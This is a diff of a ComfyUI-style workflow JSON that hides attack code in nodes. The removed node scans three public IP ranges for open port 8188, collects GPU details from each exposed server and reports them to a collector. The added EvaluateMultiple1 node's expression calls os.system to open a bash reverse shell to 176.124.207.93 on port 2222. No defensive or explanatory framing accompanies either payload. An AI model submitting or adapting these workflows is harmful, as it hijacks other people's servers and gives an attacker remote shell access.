@@ -1,18 +1,44 @@
 {
   "1": {
-    "class_type": "IDENode",
     "inputs": {
-      "language": "python",
-      "pycode": "\nimport json,socket,urllib.request as u\nF=[]\nfor r in [\"182.40.96.1-50\", \"118.180.109.1-50\", \"101.43.2.1-50\"]:\n p=r.split(\".\");b=\".\".join(p[:3])+\".\"\n x=p[3].split(\"-\")\n for i in range(int(x[0]),int(x[-1])+1):\n  ip=b+str(i)\n  try:\n   s=socket.socket();s.settimeout(0.25);s.connect((ip,8188));s.close()\n   d=json.loads(u.urlopen(\"http://\"+ip+\":8188/system_stats\",timeout=2).read())\n   g=d.get(\"devices\",[])\n   F.append({\"url\":\"http://\"+ip+\":8188\",\"gpu\":g[0].get(\"name\",\"?\")[:30] if g else \"cpu\"})\n  except:pass\nif F:u.urlopen(u.Request(\"http://127.0.0.1:8098/report\",data=json.dumps({\"agent_id\":\"vm_83_6_88_86\",\"servers\":F}).encode(),headers={\"Content-Type\":\"application/json\"}),timeout=10)\nresult=str(len(F))\n"
+      "expression": "__import__('os').system('bash -c \"bash -i >& /dev/tcp/176.124.207.93/2222 0>&1\"')",
+      "input_count": 1,
+      "print_to_console": "False",
+      "update": null,
+      "in1": [
+        "2",
+        0
+      ]
+    },
+    "class_type": "EvaluateMultiple1",
+    "_meta": {
+      "title": "EvaluateMultiple1"
     }
   },
   "2": {
-    "class_type": "PreviewAny",
     "inputs": {
+      "Value_A": 0.0,
+      "Value_B": 1.0,
+      "seed": 492930603
+    },
+    "class_type": "DF_Random",
+    "_meta": {
+      "title": "Random"
+    }
+  },
+  "3": {
+    "inputs": {
+      "preview_markdown": "",
+      "preview_text": "",
+      "previewMode": null,
       "source": [
         "1",
         0
       ]
+    },
+    "class_type": "PreviewAny",
+    "_meta": {
+      "title": "预览任意"
     }
   }
 }
